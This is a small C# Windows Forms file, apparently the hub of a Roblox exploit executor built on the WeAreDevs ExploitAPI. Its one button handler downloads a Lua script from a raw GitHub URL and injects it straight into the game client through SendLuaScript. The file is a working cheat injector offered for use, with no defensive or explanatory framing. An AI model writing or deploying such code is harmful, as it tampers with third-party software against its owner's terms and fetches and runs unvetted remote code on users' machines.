using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;

namespace CryT_Remade
{
    public partial class Hub : Form
    {
        WeAreDevs_API.ExploitAPI WrdApi = new ExploitAPI();

        public Hub()
        {
            InitializeComponent();
        }

        private void siticoneButton5_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW");
            WrdApi.SendLuaScript(Script);
        }
    }
}
